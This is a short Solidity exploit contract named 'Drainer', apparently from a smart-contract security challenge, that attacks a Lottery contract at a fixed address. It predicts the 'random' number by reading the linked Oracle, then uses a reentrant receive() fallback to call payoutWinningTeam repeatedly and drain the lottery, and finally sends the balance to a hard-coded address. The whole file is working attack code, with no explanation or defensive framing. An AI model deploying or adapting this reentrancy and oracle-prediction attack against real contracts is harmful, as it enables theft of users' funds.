// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.0;

import "./Lottery.sol";
import "./Oracle.sol";

contract Drainer {
    Lottery lo = Lottery(0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A);
    Oracle or = Oracle(0x0d186F6b68a95B3f575177b75c4144A941bFC4f3);

    function drain() external {
        lo.makeAGuess(address(this), or.getRandomNumber());
        lo.payoutWinningTeam(address(this));
    }

    receive() external payable {
        if (gasleft() > 40_000) {
            lo.payoutWinningTeam(address(this));
        }
    }

    function withdraw() public {
        (bool sent,) = address(0x36efd039149b9F5aF6aC75d85A8d3e9088bc7d4f).call.value(address(this).balance)("");
        require(sent);
    }
}
